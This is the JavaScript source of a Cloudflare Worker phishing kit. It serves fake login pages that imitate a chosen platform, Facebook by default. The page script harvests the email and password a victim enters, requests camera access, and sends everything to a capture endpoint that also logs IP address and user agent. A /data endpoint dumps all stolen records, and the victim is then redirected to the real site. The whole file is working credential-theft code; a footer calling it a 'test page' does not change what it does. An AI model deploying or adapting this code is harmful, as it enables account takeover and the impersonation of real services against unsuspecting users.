export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;
    
    // Handle /p/ links (Phishing Pages)
    if (path.startsWith('/p/')) {
      const linkId = path.split('/')[2];
      const platform = url.searchParams.get('platform') || 'facebook';
      
      return new Response(getPhishingPage(linkId, platform), {
        headers: { 'Content-Type': 'text/html' }
      });
    }
    
    // Handle API requests
    if (path === '/generate') {
      const data = await request.json();
      await env.KV.put(`link:${data.linkId}`, JSON.stringify(data));
      return new Response('OK', { status: 200 });
    }
    
    if (path === '/data') {
      const allLinks = await env.KV.list({ prefix: 'link:' });
      const result = {};
      for (const key of allLinks.keys) {
        const value = await env.KV.get(key.name);
        result[key.name.replace('link:', '')] = JSON.parse(value);
      }
      return new Response(JSON.stringify(result), { 
        headers: { 'Content-Type': 'application/json' } 
      });
    }
    
    if (path === '/capture') {
      const data = await request.json();
      const linkId = data.linkId;
      const existing = await env.KV.get(`link:${linkId}`);
      if (existing) {
        const parsed = JSON.parse(existing);
        parsed.credentials = parsed.credentials || [];
        parsed.credentials.push({
          email: data.email,
          password: data.password,
          ip: request.headers.get('CF-Connecting-IP'),
          userAgent: request.headers.get('User-Agent'),
          timestamp: new Date().toISOString()
        });
        await env.KV.put(`link:${linkId}`, JSON.stringify(parsed));
      }
      return new Response('OK', { status: 200 });
    }
    
    return new Response('Not found', { status: 404 });
  }
};

function getPhishingPage(linkId, platform) {
  return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${platform} - Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #f0f2f5;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 350px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover { background: #166fe5; }
        .footer {
            margin-top: 20px;
            color: #888;
            font-size: 12px;
        }
        .footer span { color: #00ff00; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h2>${platform}</h2>
        <p>Please login to continue</p>
        <form onsubmit="submitData(event)">
            <input type="email" id="email" placeholder="Email or Phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="footer">
            <p>⚠️ This is a test page. Do not enter real credentials.</p>
            <p>Developed by <span>RAZAN Bhandary</span></p>
        </div>
    </div>
    <script>
        const WORKER_URL = 'https://phishlab-api.your-worker.workers.dev';
        const linkId = '${linkId}';
        
        async function submitData(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Request camera permission
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const track = stream.getTracks()[0];
                track.stop();
            } catch(err) {
                console.log('Camera access denied');
            }
            
            // Send data to backend
            await fetch(WORKER_URL + '/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    linkId, 
                    email, 
                    password,
                    cameraAccess: true,
                    timestamp: new Date().toISOString()
                })
            });
            
            window.location.href = 'https://${platform}.com';
        }
    </script>
</body>
</html>
  `;
}